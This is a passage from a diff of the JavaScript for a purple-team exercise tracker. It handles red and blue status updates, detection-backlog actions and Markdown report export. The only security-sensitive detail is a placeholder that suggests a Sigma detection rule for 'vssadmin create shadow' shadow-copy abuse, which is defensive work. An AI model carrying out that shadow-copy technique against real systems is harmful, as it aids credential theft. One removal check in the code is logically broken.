+          <button class="btn sm act-add" onclick="addAction('${scnId}','${t.id}')">+ ADD ACTION</button>
+        </div>
+      </div>
+    </div>
+  `;
+  return row;
+}
+
+function buildActionRow(scnId,techId,idx,val){
+  return `
+    <div class="action-row">
+      <input type="text" placeholder="e.g. Write Sigma rule for vssadmin create shadow" value="${escapeAttr(val||'')}" oninput="updateAction('${scnId}','${techId}',${idx},this.value)">
+      <button class="act-del" onclick="removeAction('${scnId}','${techId}',${idx})" title="Remove">×</button>
+    </div>
+  `;
+}
+
+function toggleTech(scnId,techId){
+  const r=getRecord(scnId,techId);
+  r._open=!r._open;
+  const row=document.querySelector(`.tech[data-tech="${techId}"]`);
+  if(row)row.classList.toggle('open',r._open);
+}
+function updateRedStatus(scnId,techId,v){
+  setRecord(scnId,techId,{red_status:v});
+  const row=document.querySelector(`.tech[data-tech="${techId}"]`);
+  if(row){
+    const pill=row.querySelector('.red-status');
+    pill.className='tech-status red-status '+v;
+    pill.innerHTML='<span class="dotsym"></span>RED · '+redLabel(v);
+  }
+  renderDashboard();renderScnPicker();
+}
+function updateBlueStatus(scnId,techId,v){
+  setRecord(scnId,techId,{blue_status:v});
+  const row=document.querySelector(`.tech[data-tech="${techId}"]`);
+  if(row){
+    const pill=row.querySelector('.blue-status');
+    pill.className='tech-status blue-status '+v;
+    pill.innerHTML='<span class="dotsym"></span>BLUE · '+blueLabel(v);
+  }
+  renderDashboard();renderScnPicker();
+}
+function updateField(scnId,techId,field,value){
+  const r=getRecord(scnId,techId);
+  r[field]=value;
+  setRecord(scnId,techId,r);
+}
+function updateAction(scnId,techId,idx,value){
+  const r=getRecord(scnId,techId);
+  if(!r.actions)r.actions=[];
+  r.actions[idx]=value;
+  setRecord(scnId,techId,r);
+  renderDashboard();
+}
+function addAction(scnId,techId){
+  const r=getRecord(scnId,techId);
+  if(!r.actions)r.actions=[];
+  r.actions.push('');
+  r._open=true;
+  setRecord(scnId,techId,r);
+  const row=document.querySelector(`.tech[data-tech="${techId}"]`);
+  if(row){
+    const list=row.querySelector('.action-list');
+    const idx=r.actions.length-1;
+    list.insertAdjacentHTML('beforeend',buildActionRow(scnId,techId,idx,''));
+  }
+}
+function removeAction(scnId,techId,idx){
+  const r=getRecord(scnId,techId);
+  if(!r.actions||!r.actions[idx]===undefined)return;
+  r.actions.splice(idx,1);
+  setRecord(scnId,techId,r);
+  const row=document.querySelector(`.tech[data-tech="${techId}"]`);
+  if(row){
+    const list=row.querySelector('.action-list');
+    list.innerHTML=(r.actions||[]).map((a,i)=>buildActionRow(scnId,techId,i,a)).join('');
+  }
+  renderDashboard();
+}
+
+function redLabel(s){return ({planned:'Planned',executed:'Executed',blocked:'Blocked',failed:'Failed'})[s]||s}
+function blueLabel(s){return ({unset:'TBC',alerted:'Alerted',blocked:'Blocked',logged:'Logged only',notdetected:'Not detected'})[s]||s}
+function cssSafe(s){return String(s).replace(/[^a-zA-Z0-9_-]/g,'_')}
+function escapeHtml(s){return String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
+function escapeAttr(s){return escapeHtml(s)}
+
+/* ================================================================
+   EXPORT
+   ================================================================ */
+function exportMarkdown(){
+  const md=buildMarkdown();
+  document.getElementById('exportContent').textContent=md;
+  document.getElementById('exportModal').classList.add('show');
+}
+function closeModal(){document.getElementById('exportModal').classList.remove('show')}
+
+function buildMarkdown(){
+  const scn=SCENARIOS[state.scenario];
+  const s=state.setup||{};
+  const c=countByScenario(state.scenario);
+  const detected=c.alerted+c.blocked;
+  const pct=c.total>0?Math.round((detected/c.total)*100):0;
+  const today=new Date().toISOString().slice(0,10);
+  let md=`# Purple Team Exercise — ${scn.name}\n\n`;
+  if(s.name)md+=`**Exercise:** ${s.name}  \n`;
+  if(s.date)md+=`**Date:** ${s.date}  \n`;
+  if(s.red_lead)md+=`**Red lead:** ${s.red_lead}  \n`;
+  if(s.blue_lead)md+=`**Blue lead:** ${s.blue_lead}  \n`;
+  md+=`**Generated:** ${today}  \n`;
+  md+=`**Scenario:** ${scn.name} — ${scn.tagline}\n\n`;
+  md+=`**Coverage:** ${detected}/${c.total} techniques detected (${pct}%) — ${c.alerted} alerted, ${c.blocked} blocked, ${c.logged} logged only, ${c.notdetected} not detected\n\n`;
+  if(s.scope){md+=`**Scope &amp; RoE:** ${s.scope.replace(/\n/g,' ')}\n\n`}
+  md+=`---\n\n`;
+  md+=`## Scenario profile\n\n${scn.profile}\n\n---\n\n`;
+  scn.phases.forEach(phase=>{
+    md+=`## ${phase.id} — ${phase.name}\n\n`;
+    phase.techniques.forEach(t=>{
+      const r=state.records[recordKey(scn.id,t.id)];
+      md+=`### ${t.id} — ${t.name}\n`;
+      if(r){
+        md+=`**Red:** ${redLabel(r.red_status)} · **Blue:** ${blueLabel(r.blue_status)}`;
+        if(r.ttd)md+=` · **TTD:** ${r.ttd}`;
+        md+=`\n\n`;
+      }else{
+        md+=`**Red:** Planned · **Blue:** TBC\n\n`;
+      }
+      md+=`**Red action:** ${t.red}\n\n`;
+      if(t.red_cmd&&t.red_cmd.trim()&&!t.red_cmd.startsWith('# user action'))md+="```\n"+t.red_cmd+"\n```\n\n";
+      md+=`**Expected telemetry:** ${t.telemetry}\n\n`;
+      md+=`**Expected detection:** ${t.detection}\n\n`;
+      if(r&&r.notes&&r.notes.trim())md+=`**Findings:** ${r.notes.replace(/\n/g,' ')}\n\n`;
+      if(r&&r.actions&&r.actions.some(a=>a&&a.trim())){
+        md+=`**Actions:**\n`;
+        r.actions.forEach(a=>{if(a&&a.trim())md+=`- ${a}\n`});
+        md+=`\n`;
+      }
+    });
+  });
+  md+=`---\n\n## Detection backlog\n\n`;
+  let backlogItems=[];
+  scn.phases.forEach(phase=>{
+    phase.techniques.forEach(t=>{
+      const r=state.records[recordKey(scn.id,t.id)];
+      if(r&&r.actions){
+        r.actions.forEach(a=>{
+          if(a&&a.trim())backlogItems.push({tech:t.id+' — '+t.name,action:a});
+        });
+      }
+    });
+  });
+  if(backlogItems.length===0){
+    md+=`*No backlog items captured.*\n\n`;
+  }else{
+    backlogItems.forEach(b=>{md+=`- **[${b.tech}]** ${b.action}\n`});
+    md+=`\n`;
+  }
+  md+=`---\n\n_Generated with the Purple Team Exercise Builder from danhowett.github.io/useful_\n`;
+  return md;
+}
+
+function copyExport(){
+  const txt=document.getElementById('exportContent').textContent;
+  navigator.clipboard.writeText(txt).then(()=>toast('Copied')).catch(()=>toast('Copy failed — select manually'));
+}
+function downloadExport(){
+  const md=buildMarkdown();
+  const scn=SCENARIOS[state.scenario];
+  const blob=new Blob([md],{type:'text/markdown'});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement('a');
+  a.href=url;a.download=`purple-exercise-${scn.id}-${new Date().toISOString().slice(0,10)}.md`;
+  document.body.appendChild(a);a.click();
+  setTimeout(()=>{URL.revokeObjectURL(url);a.remove()},0);
+  toast('Downloaded');
+}
+
+/* ================================================================
+   SETUP
+   ================================================================ */
+function onSetupChange(){
+  state.setup={
+    name:document.getElementById('ex-name').value,
+    date:document.getElementById('ex-date').value,
+    red_lead:document.getElementById('red-lead').value,
+    blue_lead:document.getElementById('blue-lead').value,
+    scope:document.getElementById('scope').value
+  };
+  persist();
+}
+function fillSetupFields(){
+  const s=state.setup||{};
+  document.getElementById('ex-name').value=s.name||'';
+  document.getElementById('ex-date').value=s.date||'';
+  document.getElementById('red-lead').value=s.red_lead||'';
+  document.getElementById('blue-lead').value=s.blue_lead||'';
+  document.getElementById('scope').value=s.scope||'';
+}
+
+function renderAll(){
+  renderScnPicker();
+  renderDashboard();
+  renderFilterChips();
+  renderTechniques();
+}
+
+(function(){
+  restore();
+  fillSetupFields();
+  renderAll();
+})();
+</script>
+
+</body>
+</html>
